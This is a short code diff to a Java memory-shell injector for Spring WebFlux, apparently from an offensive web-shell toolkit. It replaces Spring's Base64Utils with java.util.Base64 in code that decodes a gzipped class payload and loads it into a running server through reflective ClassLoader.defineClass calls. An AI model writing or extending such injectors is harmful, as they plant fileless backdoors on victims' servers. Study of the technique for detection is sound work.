@@ -1,6 +1,5 @@
 package com.reajason.javaweb.memshell.injector.springwebflux;
 
-import org.springframework.util.Base64Utils;
 import org.springframework.web.reactive.function.server.*;
 import org.springframework.web.reactive.function.server.support.RouterFunctionMapping;
 
@@ -63,7 +62,7 @@ public class SpringWebFluxHandlerFunctionInjector {
         try {
             interceptor = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(Base64Utils.decodeFromString(getBase64String()));
+            byte[] clazzByte = gzipDecompress(java.util.Base64.getDecoder().decode(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
